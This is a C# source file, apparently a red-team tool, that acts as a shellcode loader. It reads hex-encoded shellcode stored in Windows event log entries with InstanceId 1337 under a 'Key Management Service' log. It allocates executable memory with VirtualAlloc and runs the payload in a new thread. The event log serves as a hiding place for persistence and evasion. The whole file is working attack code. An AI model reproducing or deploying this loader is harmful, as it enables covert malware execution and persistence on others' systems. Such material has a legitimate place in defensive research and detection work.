using System;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpEventPersistDLL
{
    class Program
    {

        static void Main(string[] args)
        {
            EventLog log = new EventLog("Key Management Service");
            var entries = log.Entries.Cast<EventLogEntry>().Where(x => x.InstanceId == 1337).Select(x => new
            {
                x.Message
            }).ToList();

            string shellcodeEvent = string.Empty;
            foreach (var entry in entries)
            {
                shellcodeEvent += entry.Message;
            }

            byte[] sc = HexStringConverter.ToByteArray(shellcodeEvent);
            IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
            Marshal.Copy(sc, 0, baseAddr, sc.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, (UIntPtr)0, baseAddr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;

        }
        static class HexStringConverter
        {
            public static byte[] ToByteArray(String HexString)
            {
                int NumberChars = HexString.Length;
                byte[] bytes = new byte[NumberChars / 2];
                for (int i = 0; i < NumberChars; i += 2)
                {
                    bytes[i / 2] = Convert.ToByte(HexString.Substring(i, 2), 16);
                }
                return bytes;
            }
        }
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            UIntPtr dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            UIntPtr dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

    }
}